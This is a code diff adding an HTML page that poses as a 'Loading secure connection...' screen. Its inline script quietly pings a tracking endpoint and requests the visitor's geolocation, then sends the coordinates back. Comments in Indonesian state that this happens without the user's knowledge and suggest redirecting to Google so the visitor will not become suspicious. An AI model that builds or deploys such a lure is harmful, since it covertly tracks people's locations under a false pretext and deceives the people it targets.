@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .loader {
+            border: 2px solid #00ff41;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            margin-top: 20px;
+            font-size: 14px;
+            opacity: 0.7;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <p>Loading secure connection...</p>
+
+    <script>
+        // Kirim data ke tracker tanpa sepengetahuan user
+        (function() {
+            // Kirim tracking via fetch (tanpa visible effect)
+            fetch('/track')
+                .then(() => {})
+                .catch(() => {});
+            
+            // Ambil lokasi tambahan dari browser (jika user izinkan)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        fetch('/track?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude)
+                            .catch(() => {});
+                    },
+                    function() {}
+                );
+            }
+            
+            // Coba ambil data WiFi/BTS (jika ada)
+            // Tidak bisa via JS murni, ini hanya untuk show
+        })();
+
+        // Redirect ke halaman normal setelah tracking
+        // Bisa diarahkan ke URL lain biar gak curiga
+        // window.location.href = 'https://www.google.com';
+    </script>
+</body>
+</html>
